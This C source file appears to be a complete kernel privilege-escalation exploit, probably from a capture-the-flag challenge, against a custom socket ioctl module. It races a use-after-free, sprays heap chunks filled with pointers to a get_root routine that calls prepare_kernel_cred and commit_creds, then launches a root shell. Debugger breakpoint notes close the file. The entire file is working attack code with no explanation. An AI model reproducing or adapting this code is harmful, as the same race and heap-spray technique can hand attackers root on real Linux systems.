#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/msg.h>
#include <stdio.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include <linux/xfrm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <strings.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/keyctl.h>
#include <sys/mman.h>

int port;

void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}


typedef struct _arg_t {
	uint64_t size;
	uint64_t rounds;
	uint64_t key;
	uint64_t security;
}arg_t;

typedef struct _debug_t{
	uint64_t off;
	uint64_t *data;
}debug_t;

#define OPTION_CALL	 0x1337
#define OPTION_PUT	  0x1338
#define OPTION_DEBUG	0x1339


int client()
{
	puts("Client started");
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(port);
	if (connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
		errExit("connection with the server failed...\n");
	}
	puts("Client finished");
	return sockfd;
}

struct th_arg
{
	int clientfd;
	int connfd;
	int connfd2;
	int clientfd2;
};

uintptr_t a[0x40000/8];

void* spray_32(void* fds_)
{
	intptr_t fds = (intptr_t)fds_;
	int connfd2 = (int)fds;
	int connfd = fds >> 32;
	printf("free %d\n", ioctl(connfd, OPTION_PUT, NULL));
	// we free chunk here after thread creation,
	// because thread creation will consume 32-byte chunk
	while (1)
	{ // `recv` large data to let this thread enter the while loop at secure_hash
		recv(connfd2, a, sizeof(a), 0);
	}
	return NULL;
}

void * client_write(void * args_)
{
	struct th_arg* args = (struct th_arg*)args_;
	sleep(1);

	pthread_t thread2;
	pthread_create(&thread2, NULL, spray_32, \
		(void*)(intptr_t)(args->connfd2 + ((int64_t)args->connfd << 32)));

	// stop this thread for a while before resuming main thread,
	// otherwise main thread will call function pointer field too soon,
	// before while loop at secure_hash is entered in another thread,
	// loop bound is tuned to be 50 so that success rate is quite high
	for (int i = 0; i < 50; ++i)
	{
		sched_yield();
		usleep(1);
	}
	write(args->clientfd, "20192019", 8);
	puts("client_write exits");
	return NULL;
}



int prepare_spray_32(int sockfd, int64_t* clientfd)
{
	struct sockaddr_in servaddr, cli;
	*clientfd = client();

	unsigned int len = sizeof(cli);
	int connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
	if (connfd < 0)
	{
		errExit("server accept failed...\n");
	}

	arg_t arg = {4, 0, 4, 1};
	printf("%d\n", ioctl(connfd, OPTION_CALL, &arg));

	printf("%ld\n", send(*clientfd, a, sizeof(a), 0));

	return connfd;
}

__attribute__((naked)) void get_root()
{
	__asm("mov rbx, [rsp+0xb8]");
	__asm("sub rbx, 0x9e13dc"); // prepare_kernel_cred
	__asm("xor rdi, rdi");
	__asm("call rbx");
	__asm("mov rdi, rax");
	__asm("sub rbx, 0x500"); // commit_cred
	__asm("call rbx");
	__asm("ret");
}

int main(int argc, char const *argv[])
{
	for (size_t i = 0; i < sizeof(a) / sizeof(uintptr_t); i++)
	{
		a[i] = (uintptr_t)get_root;
	}

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in servaddr, cli;
	bzero(&servaddr, sizeof(servaddr));

	port = argc < 2 ? 20190 : atoi(argv[1]);
	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(port);

	if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)
	{
		errExit("socket bind failed...\n");
	}

	if ((listen(sockfd, 5)) != 0)
	{
		errExit("Listen failed...\n");
	}

	int clientfd = client();

	unsigned int len = sizeof(cli);
	int connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
	if (connfd < 0)
	{
		errExit("server accept failed...\n");
	}


	arg_t a = {4, 0, 0x13371337, 0};
	printf("%d\n", ioctl(connfd, OPTION_CALL, &a));

	int64_t clientfd2 = 0;
	int64_t connfd2 = prepare_spray_32(sockfd, &clientfd2);

	struct th_arg args = {clientfd, connfd, connfd2, clientfd2};
	pthread_t thread;
	pthread_create(&thread, NULL, client_write, &args);

	char buf[0x100];
	recv(connfd, buf, sizeof(buf), 0);//*/
	sleep(1);
	system("/bin/sh");
	return 0;
}

/*
kfree: b *0xffffffffc0359110-0x150+0x250
call rax: b *0xffffffffc00ad110-0x150+0x388
kmalloc: b *0xffffffffc00ad110-0x150+0xa1
*/